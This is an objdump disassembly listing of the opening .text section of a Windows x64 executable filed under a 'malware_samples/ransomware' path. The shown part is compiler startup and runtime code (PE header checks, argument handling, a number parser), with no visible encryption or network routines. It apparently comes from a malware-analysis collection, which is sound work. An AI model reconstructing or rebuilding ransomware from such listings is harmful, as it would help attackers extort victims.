
malware_samples/ransomware/e89eb46a4bd46b2afc00ca271ecfb342321d6de42bfa106832846248d0f7d253.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001010:	41 57                	push   %r15
   140001012:	41 56                	push   %r14
   140001014:	41 55                	push   %r13
   140001016:	41 54                	push   %r12
   140001018:	55                   	push   %rbp
   140001019:	57                   	push   %rdi
   14000101a:	56                   	push   %rsi
   14000101b:	53                   	push   %rbx
   14000101c:	48 83 ec 58          	sub    $0x58,%rsp
   140001020:	b8 30 00 00 00       	mov    $0x30,%eax
   140001025:	65 67 48 8b 00       	mov    %gs:(%eax),%rax
   14000102a:	48 8b 70 08          	mov    0x8(%rax),%rsi
   14000102e:	48 8b 1d ab 77 02 00 	mov    0x277ab(%rip),%rbx        # 0x1400287e0
   140001035:	48 8b 3d 34 17 03 00 	mov    0x31734(%rip),%rdi        # 0x140032770
   14000103c:	eb 12                	jmp    0x140001050
   14000103e:	66 90                	xchg   %ax,%ax
   140001040:	48 39 c6             	cmp    %rax,%rsi
   140001043:	0f 84 b7 00 00 00    	je     0x140001100
   140001049:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000104e:	ff d7                	call   *%rdi
   140001050:	31 c0                	xor    %eax,%eax
   140001052:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   140001057:	75 e7                	jne    0x140001040
   140001059:	45 31 f6             	xor    %r14d,%r14d
   14000105c:	48 8b 2d 8d 77 02 00 	mov    0x2778d(%rip),%rbp        # 0x1400287f0
   140001063:	8b 45 00             	mov    0x0(%rbp),%eax
   140001066:	83 f8 01             	cmp    $0x1,%eax
   140001069:	0f 84 59 03 00 00    	je     0x1400013c8
   14000106f:	8b 45 00             	mov    0x0(%rbp),%eax
   140001072:	85 c0                	test   %eax,%eax
   140001074:	0f 84 96 00 00 00    	je     0x140001110
   14000107a:	c7 05 80 ff 02 00 01 	movl   $0x1,0x2ff80(%rip)        # 0x140031004
   140001081:	00 00 00 
   140001084:	45 85 f6             	test   %r14d,%r14d
   140001087:	0f 84 9b 02 00 00    	je     0x140001328
   14000108d:	48 8b 05 cc 76 02 00 	mov    0x276cc(%rip),%rax        # 0x140028760
   140001094:	48 8b 00             	mov    (%rax),%rax
   140001097:	48 85 c0             	test   %rax,%rax
   14000109a:	74 0c                	je     0x1400010a8
   14000109c:	45 31 c0             	xor    %r8d,%r8d
   14000109f:	ba 02 00 00 00       	mov    $0x2,%edx
   1400010a4:	31 c9                	xor    %ecx,%ecx
   1400010a6:	ff d0                	call   *%rax
   1400010a8:	e8 23 e2 00 00       	call   0x14000f2d0
   1400010ad:	4c 8b 05 5c ff 02 00 	mov    0x2ff5c(%rip),%r8        # 0x140031010
   1400010b4:	8b 0d 66 ff 02 00    	mov    0x2ff66(%rip),%ecx        # 0x140031020
   1400010ba:	4c 89 00             	mov    %r8,(%rax)
   1400010bd:	48 8b 15 54 ff 02 00 	mov    0x2ff54(%rip),%rdx        # 0x140031018
   1400010c4:	e8 27 26 02 00       	call   0x1400236f0
   1400010c9:	8b 0d 39 ff 02 00    	mov    0x2ff39(%rip),%ecx        # 0x140031008
   1400010cf:	85 c9                	test   %ecx,%ecx
   1400010d1:	0f 84 fb 02 00 00    	je     0x1400013d2
   1400010d7:	8b 15 27 ff 02 00    	mov    0x2ff27(%rip),%edx        # 0x140031004
   1400010dd:	85 d2                	test   %edx,%edx
   1400010df:	0f 84 2b 02 00 00    	je     0x140001310
   1400010e5:	48 83 c4 58          	add    $0x58,%rsp
   1400010e9:	5b                   	pop    %rbx
   1400010ea:	5e                   	pop    %rsi
   1400010eb:	5f                   	pop    %rdi
   1400010ec:	5d                   	pop    %rbp
   1400010ed:	41 5c                	pop    %r12
   1400010ef:	41 5d                	pop    %r13
   1400010f1:	41 5e                	pop    %r14
   1400010f3:	41 5f                	pop    %r15
   1400010f5:	c3                   	ret
   1400010f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400010fd:	00 00 00 
   140001100:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140001106:	e9 51 ff ff ff       	jmp    0x14000105c
   14000110b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001110:	c7 45 00 01 00 00 00 	movl   $0x1,0x0(%rbp)
   140001117:	e8 e4 c9 00 00       	call   0x14000db00
   14000111c:	48 8d 0d bd cd 00 00 	lea    0xcdbd(%rip),%rcx        # 0x14000dee0
   140001123:	ff 15 3f 16 03 00    	call   *0x3163f(%rip)        # 0x140032768
   140001129:	48 8b 15 a0 76 02 00 	mov    0x276a0(%rip),%rdx        # 0x1400287d0
   140001130:	48 8d 0d c9 fe ff ff 	lea    -0x137(%rip),%rcx        # 0x140001000
   140001137:	48 89 02             	mov    %rax,(%rdx)
   14000113a:	e8 f1 e2 00 00       	call   0x14000f430
   14000113f:	e8 fc d1 00 00       	call   0x14000e340
   140001144:	48 8b 05 55 76 02 00 	mov    0x27655(%rip),%rax        # 0x1400287a0
   14000114b:	31 c9                	xor    %ecx,%ecx
   14000114d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001153:	48 8b 05 56 76 02 00 	mov    0x27656(%rip),%rax        # 0x1400287b0
   14000115a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001160:	48 8b 05 59 76 02 00 	mov    0x27659(%rip),%rax        # 0x1400287c0
   140001167:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000116d:	48 8b 05 bc 75 02 00 	mov    0x275bc(%rip),%rax        # 0x140028730
   140001174:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001179:	75 45                	jne    0x1400011c0
   14000117b:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000117f:	48 01 d0             	add    %rdx,%rax
   140001182:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001188:	75 36                	jne    0x1400011c0
   14000118a:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   14000118e:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   140001193:	0f 84 11 02 00 00    	je     0x1400013aa
   140001199:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   14000119e:	75 20                	jne    0x1400011c0
   1400011a0:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400011a7:	76 17                	jbe    0x1400011c0
   1400011a9:	44 8b 88 f8 00 00 00 	mov    0xf8(%rax),%r9d
   1400011b0:	31 c9                	xor    %ecx,%ecx
   1400011b2:	45 85 c9             	test   %r9d,%r9d
   1400011b5:	0f 95 c1             	setne  %cl
   1400011b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400011bf:	00 
   1400011c0:	48 8b 05 c9 75 02 00 	mov    0x275c9(%rip),%rax        # 0x140028790
   1400011c7:	89 0d 3b fe 02 00    	mov    %ecx,0x2fe3b(%rip)        # 0x140031008
   1400011cd:	44 8b 00             	mov    (%rax),%r8d
   1400011d0:	45 85 c0             	test   %r8d,%r8d
   1400011d3:	0f 85 5f 01 00 00    	jne    0x140001338
   1400011d9:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400011de:	e8 f5 e1 00 00       	call   0x14000f3d8
   1400011e3:	e8 b8 e1 00 00       	call   0x14000f3a0
   1400011e8:	48 8b 15 71 76 02 00 	mov    0x27671(%rip),%rdx        # 0x140028860
   1400011ef:	8b 12                	mov    (%rdx),%edx
   1400011f1:	89 10                	mov    %edx,(%rax)
   1400011f3:	e8 a0 e1 00 00       	call   0x14000f398
   1400011f8:	48 8b 15 41 76 02 00 	mov    0x27641(%rip),%rdx        # 0x140028840
   1400011ff:	8b 12                	mov    (%rdx),%edx
   140001201:	89 10                	mov    %edx,(%rax)
   140001203:	e8 68 c5 00 00       	call   0x14000d770
   140001208:	85 c0                	test   %eax,%eax
   14000120a:	0f 88 f1 00 00 00    	js     0x140001301
   140001210:	48 8b 05 e9 73 02 00 	mov    0x273e9(%rip),%rax        # 0x140028600
   140001217:	83 38 01             	cmpl   $0x1,(%rax)
   14000121a:	0f 84 79 01 00 00    	je     0x140001399
   140001220:	48 8b 05 49 75 02 00 	mov    0x27549(%rip),%rax        # 0x140028770
   140001227:	83 38 ff             	cmpl   $0xffffffff,(%rax)
   14000122a:	0f 84 5a 01 00 00    	je     0x14000138a
   140001230:	48 8b 15 f9 75 02 00 	mov    0x275f9(%rip),%rdx        # 0x140028830
   140001237:	48 8b 0d e2 75 02 00 	mov    0x275e2(%rip),%rcx        # 0x140028820
   14000123e:	e8 e5 e1 00 00       	call   0x14000f428
   140001243:	85 c0                	test   %eax,%eax
   140001245:	0f 85 35 01 00 00    	jne    0x140001380
   14000124b:	48 8b 05 1e 76 02 00 	mov    0x2761e(%rip),%rax        # 0x140028870
   140001252:	4c 8d 05 b7 fd 02 00 	lea    0x2fdb7(%rip),%r8        # 0x140031010
   140001259:	48 8d 15 b8 fd 02 00 	lea    0x2fdb8(%rip),%rdx        # 0x140031018
   140001260:	48 8d 0d b9 fd 02 00 	lea    0x2fdb9(%rip),%rcx        # 0x140031020
   140001267:	8b 00                	mov    (%rax),%eax
   140001269:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   14000126d:	48 8b 05 dc 75 02 00 	mov    0x275dc(%rip),%rax        # 0x140028850
   140001274:	44 8b 08             	mov    (%rax),%r9d
   140001277:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   14000127c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001281:	e8 8a e0 00 00       	call   0x14000f310
   140001286:	85 c0                	test   %eax,%eax
   140001288:	78 77                	js     0x140001301
   14000128a:	4c 63 25 8f fd 02 00 	movslq 0x2fd8f(%rip),%r12        # 0x140031020
   140001291:	41 8d 4c 24 01       	lea    0x1(%r12),%ecx
   140001296:	48 63 c9             	movslq %ecx,%rcx
   140001299:	48 c1 e1 03          	shl    $0x3,%rcx
   14000129d:	e8 16 e2 00 00       	call   0x14000f4b8
   1400012a2:	49 89 c5             	mov    %rax,%r13
   1400012a5:	48 85 c0             	test   %rax,%rax
   1400012a8:	74 57                	je     0x140001301
   1400012aa:	45 85 e4             	test   %r12d,%r12d
   1400012ad:	0f 8e 99 00 00 00    	jle    0x14000134c
   1400012b3:	4c 8b 3d 5e fd 02 00 	mov    0x2fd5e(%rip),%r15        # 0x140031018
   1400012ba:	be 01 00 00 00       	mov    $0x1,%esi
   1400012bf:	eb 20                	jmp    0x1400012e1
   1400012c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400012c8:	49 8b 54 f7 f8       	mov    -0x8(%r15,%rsi,8),%rdx
   1400012cd:	49 89 f8             	mov    %rdi,%r8
   1400012d0:	48 89 c1             	mov    %rax,%rcx
   1400012d3:	e8 98 e1 00 00       	call   0x14000f470
   1400012d8:	49 39 f4             	cmp    %rsi,%r12
   1400012db:	74 6a                	je     0x140001347
   1400012dd:	48 83 c6 01          	add    $0x1,%rsi
   1400012e1:	49 8b 4c f7 f8       	mov    -0x8(%r15,%rsi,8),%rcx
   1400012e6:	e8 95 e0 00 00       	call   0x14000f380
   1400012eb:	48 8d 78 01          	lea    0x1(%rax),%rdi
   1400012ef:	48 89 f9             	mov    %rdi,%rcx
   1400012f2:	e8 c1 e1 00 00       	call   0x14000f4b8
   1400012f7:	49 89 44 f5 f8       	mov    %rax,-0x8(%r13,%rsi,8)
   1400012fc:	48 85 c0             	test   %rax,%rax
   1400012ff:	75 c7                	jne    0x1400012c8
   140001301:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001306:	e8 d5 df 00 00       	call   0x14000f2e0
   14000130b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001310:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   140001314:	e8 df e0 00 00       	call   0x14000f3f8
   140001319:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   14000131d:	e9 c3 fd ff ff       	jmp    0x1400010e5
   140001322:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001328:	31 c0                	xor    %eax,%eax
   14000132a:	48 87 03             	xchg   %rax,(%rbx)
   14000132d:	e9 5b fd ff ff       	jmp    0x14000108d
   140001332:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001338:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000133d:	e8 96 e0 00 00       	call   0x14000f3d8
   140001342:	e9 9c fe ff ff       	jmp    0x1400011e3
   140001347:	4b 8d 44 e5 00       	lea    0x0(%r13,%r12,8),%rax
   14000134c:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140001353:	48 8b 15 b6 74 02 00 	mov    0x274b6(%rip),%rdx        # 0x140028810
   14000135a:	48 8b 0d 9f 74 02 00 	mov    0x2749f(%rip),%rcx        # 0x140028800
   140001361:	4c 89 2d b0 fc 02 00 	mov    %r13,0x2fcb0(%rip)        # 0x140031018
   140001368:	e8 b3 e0 00 00       	call   0x14000f420
   14000136d:	e8 de c3 00 00       	call   0x14000d750
   140001372:	c7 45 00 02 00 00 00 	movl   $0x2,0x0(%rbp)
   140001379:	e9 06 fd ff ff       	jmp    0x140001084
   14000137e:	66 90                	xchg   %ax,%ax
   140001380:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001385:	e9 5b fd ff ff       	jmp    0x1400010e5
   14000138a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000138f:	e8 04 e1 00 00       	call   0x14000f498
   140001394:	e9 97 fe ff ff       	jmp    0x140001230
   140001399:	48 8d 0d 90 c4 00 00 	lea    0xc490(%rip),%rcx        # 0x14000d830
   1400013a0:	e8 2b cb 00 00       	call   0x14000ded0
   1400013a5:	e9 76 fe ff ff       	jmp    0x140001220
   1400013aa:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   1400013ae:	0f 86 0c fe ff ff    	jbe    0x1400011c0
   1400013b4:	44 8b 90 e8 00 00 00 	mov    0xe8(%rax),%r10d
   1400013bb:	31 c9                	xor    %ecx,%ecx
   1400013bd:	45 85 d2             	test   %r10d,%r10d
   1400013c0:	0f 95 c1             	setne  %cl
   1400013c3:	e9 f8 fd ff ff       	jmp    0x1400011c0
   1400013c8:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400013cd:	e8 0e df 00 00       	call   0x14000f2e0
   1400013d2:	89 c1                	mov    %eax,%ecx
   1400013d4:	e8 67 e0 00 00       	call   0x14000f440
   1400013d9:	90                   	nop
   1400013da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400013e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013e4:	48 8b 05 a5 73 02 00 	mov    0x273a5(%rip),%rax        # 0x140028790
   1400013eb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013f1:	e8 1a fc ff ff       	call   0x140001010
   1400013f6:	90                   	nop
   1400013f7:	90                   	nop
   1400013f8:	48 83 c4 28          	add    $0x28,%rsp
   1400013fc:	c3                   	ret
   1400013fd:	0f 1f 00             	nopl   (%rax)
   140001400:	48 83 ec 28          	sub    $0x28,%rsp
   140001404:	48 8b 05 85 73 02 00 	mov    0x27385(%rip),%rax        # 0x140028790
   14000140b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001411:	e8 fa fb ff ff       	call   0x140001010
   140001416:	90                   	nop
   140001417:	90                   	nop
   140001418:	48 83 c4 28          	add    $0x28,%rsp
   14000141c:	c3                   	ret
   14000141d:	0f 1f 00             	nopl   (%rax)
   140001420:	e9 e3 df 00 00       	jmp    0x14000f408
   140001425:	90                   	nop
   140001426:	90                   	nop
   140001427:	90                   	nop
   140001428:	90                   	nop
   140001429:	90                   	nop
   14000142a:	90                   	nop
   14000142b:	90                   	nop
   14000142c:	90                   	nop
   14000142d:	90                   	nop
   14000142e:	90                   	nop
   14000142f:	90                   	nop
   140001430:	c3                   	ret
   140001431:	0f 1f 40 00          	nopl   0x0(%rax)
   140001435:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000143c:	00 00 00 00 
   140001440:	31 c0                	xor    %eax,%eax
   140001442:	c3                   	ret
   140001443:	66 90                	xchg   %ax,%ax
   140001445:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000144c:	00 00 00 00 
   140001450:	55                   	push   %rbp
   140001451:	53                   	push   %rbx
   140001452:	48 83 ec 38          	sub    $0x38,%rsp
   140001456:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000145b:	48 8d 0d 9e 3b 02 00 	lea    0x23b9e(%rip),%rcx        # 0x140025000
   140001462:	ff 15 f0 11 03 00    	call   *0x311f0(%rip)        # 0x140032658
   140001468:	48 89 c3             	mov    %rax,%rbx
   14000146b:	48 85 c0             	test   %rax,%rax
   14000146e:	74 70                	je     0x1400014e0
   140001470:	48 8d 0d 89 3b 02 00 	lea    0x23b89(%rip),%rcx        # 0x140025000
   140001477:	ff 15 33 12 03 00    	call   *0x31233(%rip)        # 0x1400326b0
   14000147d:	4c 8b 0d dc 11 03 00 	mov    0x311dc(%rip),%r9        # 0x140032660
   140001484:	48 8d 15 88 3b 02 00 	lea    0x23b88(%rip),%rdx        # 0x140025013
   14000148b:	48 89 d9             	mov    %rbx,%rcx
   14000148e:	48 89 05 ab fb 02 00 	mov    %rax,0x2fbab(%rip)        # 0x140031040
   140001495:	4c 89 4d f0          	mov    %r9,-0x10(%rbp)
   140001499:	41 ff d1             	call   *%r9
   14000149c:	48 8d 15 86 3b 02 00 	lea    0x23b86(%rip),%rdx        # 0x140025029
   1400014a3:	48 89 d9             	mov    %rbx,%rcx
   1400014a6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400014aa:	ff 55 f0             	call   *-0x10(%rbp)
   1400014ad:	4c 8b 45 f8          	mov    -0x8(%rbp),%r8
   1400014b1:	48 89 05 48 2b 02 00 	mov    %rax,0x22b48(%rip)        # 0x140024000
   1400014b8:	4d 85 c0             	test   %r8,%r8
   1400014bb:	74 11                	je     0x1400014ce
   1400014bd:	48 8d 15 9c fb 02 00 	lea    0x2fb9c(%rip),%rdx        # 0x140031060
   1400014c4:	48 8d 0d 35 8b 02 00 	lea    0x28b35(%rip),%rcx        # 0x14002a000
   1400014cb:	41 ff d0             	call   *%r8
   1400014ce:	48 8d 0d 2b 00 00 00 	lea    0x2b(%rip),%rcx        # 0x140001500
   1400014d5:	48 83 c4 38          	add    $0x38,%rsp
   1400014d9:	5b                   	pop    %rbx
   1400014da:	5d                   	pop    %rbp
   1400014db:	e9 40 ff ff ff       	jmp    0x140001420
   1400014e0:	48 8d 05 59 ff ff ff 	lea    -0xa7(%rip),%rax        # 0x140001440
   1400014e7:	4c 8d 05 42 ff ff ff 	lea    -0xbe(%rip),%r8        # 0x140001430
   1400014ee:	48 89 05 0b 2b 02 00 	mov    %rax,0x22b0b(%rip)        # 0x140024000
   1400014f5:	eb c6                	jmp    0x1400014bd
   1400014f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400014fe:	00 00 
   140001500:	55                   	push   %rbp
   140001501:	48 89 e5             	mov    %rsp,%rbp
   140001504:	48 83 ec 20          	sub    $0x20,%rsp
   140001508:	48 8b 05 f1 2a 02 00 	mov    0x22af1(%rip),%rax        # 0x140024000
   14000150f:	48 85 c0             	test   %rax,%rax
   140001512:	74 09                	je     0x14000151d
   140001514:	48 8d 0d e5 8a 02 00 	lea    0x28ae5(%rip),%rcx        # 0x14002a000
   14000151b:	ff d0                	call   *%rax
   14000151d:	48 8b 0d 1c fb 02 00 	mov    0x2fb1c(%rip),%rcx        # 0x140031040
   140001524:	48 85 c9             	test   %rcx,%rcx
   140001527:	74 0f                	je     0x140001538
   140001529:	48 83 c4 20          	add    $0x20,%rsp
   14000152d:	5d                   	pop    %rbp
   14000152e:	48 ff 25 cb 10 03 00 	rex.W jmp *0x310cb(%rip)        # 0x140032600
   140001535:	0f 1f 00             	nopl   (%rax)
   140001538:	48 83 c4 20          	add    $0x20,%rsp
   14000153c:	5d                   	pop    %rbp
   14000153d:	c3                   	ret
   14000153e:	90                   	nop
   14000153f:	90                   	nop
   140001540:	49 89 ca             	mov    %rcx,%r10
   140001543:	83 fa 50             	cmp    $0x50,%edx
   140001546:	0f 87 dc 00 00 00    	ja     0x140001628
   14000154c:	83 fa 34             	cmp    $0x34,%edx
   14000154f:	0f 87 9b 00 00 00    	ja     0x1400015f0
   140001555:	83 fa 29             	cmp    $0x29,%edx
   140001558:	76 26                	jbe    0x140001580
   14000155a:	8d 42 d6             	lea    -0x2a(%rdx),%eax
   14000155d:	83 f8 08             	cmp    $0x8,%eax
   140001560:	0f 87 a8 00 00 00    	ja     0x14000160e
   140001566:	48 8d 0d 73 3d 02 00 	lea    0x23d73(%rip),%rcx        # 0x1400252e0
   14000156d:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   140001571:	48 01 c8             	add    %rcx,%rax
   140001574:	ff e0                	jmp    *%rax
   140001576:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000157d:	00 00 00 
   140001580:	89 d1                	mov    %edx,%ecx
   140001582:	b8 01 00 00 00       	mov    $0x1,%eax
   140001587:	48 d3 e0             	shl    %cl,%rax
   14000158a:	48 b9 00 f6 ff 00 f8 	movabs $0x2f800fff600,%rcx
   140001591:	02 00 00 
   140001594:	48 85 c8             	test   %rcx,%rax
   140001597:	75 7f                	jne    0x140001618
   140001599:	48 b9 00 00 00 fe 03 	movabs $0x3fe000000,%rcx
   1400015a0:	00 00 00 
   1400015a3:	48 85 c8             	test   %rcx,%rax
   1400015a6:	75 16                	jne    0x1400015be
   1400015a8:	48 81 c1 1e 08 00 02 	add    $0x200081e,%rcx
   1400015af:	48 85 c8             	test   %rcx,%rax
   1400015b2:	74 5a                	je     0x14000160e
   1400015b4:	4d 85 c0             	test   %r8,%r8
   1400015b7:	74 55                	je     0x14000160e
   1400015b9:	4d 85 c9             	test   %r9,%r9
   1400015bc:	74 50                	je     0x14000160e
   1400015be:	41 8b 4a 28          	mov    0x28(%r10),%ecx
   1400015c2:	41 3b 4a 2c          	cmp    0x2c(%r10),%ecx
   1400015c6:	7d 46                	jge    0x14000160e
   1400015c8:	48 63 c1             	movslq %ecx,%rax
   1400015cb:	83 c1 01             	add    $0x1,%ecx
   1400015ce:	48 c1 e0 05          	shl    $0x5,%rax
   1400015d2:	49 03 42 20          	add    0x20(%r10),%rax
   1400015d6:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   1400015dd:	00 
   1400015de:	41 89 4a 28          	mov    %ecx,0x28(%r10)
   1400015e2:	89 10                	mov    %edx,(%rax)
   1400015e4:	4c 89 40 10          	mov    %r8,0x10(%rax)
   1400015e8:	4c 89 48 18          	mov    %r9,0x18(%rax)
   1400015ec:	c3                   	ret
   1400015ed:	0f 1f 00             	nopl   (%rax)
   1400015f0:	8d 4a cb             	lea    -0x35(%rdx),%ecx
   1400015f3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400015f8:	48 d3 e0             	shl    %cl,%rax
   1400015fb:	a9 07 11 c7 01       	test   $0x1c71107,%eax
   140001600:	75 16                	jne    0x140001618
   140001602:	a9 f8 2e 00 0a       	test   $0xa002ef8,%eax
   140001607:	75 ab                	jne    0x1400015b4
   140001609:	83 fa 4f             	cmp    $0x4f,%edx
   14000160c:	74 b0                	je     0x1400015be
   14000160e:	31 c0                	xor    %eax,%eax
   140001610:	c3                   	ret
   140001611:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001618:	4d 85 c0             	test   %r8,%r8
   14000161b:	75 a1                	jne    0x1400015be
   14000161d:	31 c0                	xor    %eax,%eax
   14000161f:	eb ef                	jmp    0x140001610
   140001621:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001628:	8d 42 ae             	lea    -0x52(%rdx),%eax
   14000162b:	83 f8 0c             	cmp    $0xc,%eax
   14000162e:	77 e8                	ja     0x140001618
   140001630:	48 8d 0d cd 3c 02 00 	lea    0x23ccd(%rip),%rcx        # 0x140025304
   140001637:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   14000163b:	48 01 c8             	add    %rcx,%rax
   14000163e:	ff e0                	jmp    *%rax
   140001640:	44 8b 49 28          	mov    0x28(%rcx),%r9d
   140001644:	44 3b 49 2c          	cmp    0x2c(%rcx),%r9d
   140001648:	7d 46                	jge    0x140001690
   14000164a:	49 63 c1             	movslq %r9d,%rax
   14000164d:	41 83 c1 01          	add    $0x1,%r9d
   140001651:	48 c1 e0 05          	shl    $0x5,%rax
   140001655:	48 03 41 20          	add    0x20(%rcx),%rax
   140001659:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140001660:	00 
   140001661:	44 89 49 28          	mov    %r9d,0x28(%rcx)
   140001665:	48 85 d2             	test   %rdx,%rdx
   140001668:	74 26                	je     0x140001690
   14000166a:	45 85 c0             	test   %r8d,%r8d
   14000166d:	7e 21                	jle    0x140001690
   14000166f:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140001676:	00 
   140001677:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   14000167d:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140001681:	44 89 40 18          	mov    %r8d,0x18(%rax)
   140001685:	c3                   	ret
   140001686:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000168d:	00 00 00 
   140001690:	31 c0                	xor    %eax,%eax
   140001692:	c3                   	ret
   140001693:	66 90                	xchg   %ax,%ax
   140001695:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000169c:	00 00 00 00 
   1400016a0:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   1400016a4:	0f b6 02             	movzbl (%rdx),%eax
   1400016a7:	49 89 c8             	mov    %rcx,%r8
   1400016aa:	3c 6e                	cmp    $0x6e,%al
   1400016ac:	0f 84 9e 00 00 00    	je     0x140001750
   1400016b2:	8d 50 d0             	lea    -0x30(%rax),%edx
   1400016b5:	80 fa 09             	cmp    $0x9,%dl
   1400016b8:	0f 87 b1 00 00 00    	ja     0x14000176f
   1400016be:	45 31 db             	xor    %r11d,%r11d
   1400016c1:	31 c9                	xor    %ecx,%ecx
   1400016c3:	41 b9 cd cc cc cc    	mov    $0xcccccccd,%r9d
   1400016c9:	eb 53                	jmp    0x14000171e
   1400016cb:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400016d2:	00 00 
   1400016d4:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400016db:	00 00 00 00 
   1400016df:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400016e6:	00 00 00 00 
   1400016ea:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400016f1:	00 00 00 00 
   1400016f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400016fc:	00 00 00 00 
   140001700:	8d 14 89             	lea    (%rcx,%rcx,4),%edx
   140001703:	8d 0c 50             	lea    (%rax,%rdx,2),%ecx
   140001706:	49 8b 40 18          	mov    0x18(%r8),%rax
   14000170a:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000170e:	49 89 50 18          	mov    %rdx,0x18(%r8)
   140001712:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140001716:	8d 50 d0             	lea    -0x30(%rax),%edx
   140001719:	80 fa 09             	cmp    $0x9,%dl
   14000171c:	77 22                	ja     0x140001740
   14000171e:	83 e8 30             	sub    $0x30,%eax
   140001721:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
   140001726:	0f be c0             	movsbl %al,%eax
   140001729:	29 c2                	sub    %eax,%edx
   14000172b:	49 0f af d1          	imul   %r9,%rdx
   14000172f:	48 c1 ea 23          	shr    $0x23,%rdx
   140001733:	39 ca                	cmp    %ecx,%edx
   140001735:	7d c9                	jge    0x140001700
   140001737:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000173c:	89 c8                	mov    %ecx,%eax
   14000173e:	c3                   	ret
   14000173f:	90                   	nop
   140001740:	89 c8                	mov    %ecx,%eax
   140001742:	f7 d8                	neg    %eax
   140001744:	45 85 db             	test   %r11d,%r11d
   140001747:	0f 45 c8             	cmovne %eax,%ecx
   14000174a:	89 c8                	mov    %ecx,%eax
   14000174c:	c3                   	ret
   14000174d:	0f 1f 00             	nopl   (%rax)
   140001750:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140001754:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140001758:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   14000175c:	8d 50 d0             	lea    -0x30(%rax),%edx
   14000175f:	80 fa 09             	cmp    $0x9,%dl
   140001762:	77 0b                	ja     0x14000176f
   140001764:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   14000176a:	e9 52 ff ff ff       	jmp    0x1400016c1
   14000176f:	31 c9                	xor    %ecx,%ecx
   140001771:	eb c9                	jmp    0x14000173c
   140001773:	66 90                	xchg   %ax,%ax
   140001775:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000177c:	00 00 00 00 
   140001780:	48 83 ec 28          	sub    $0x28,%rsp
   140001784:	49 89 ca             	mov    %rcx,%r10
   140001787:	85 d2                	test   %edx,%edx
   140001789:	74 25                	je     0x1400017b0
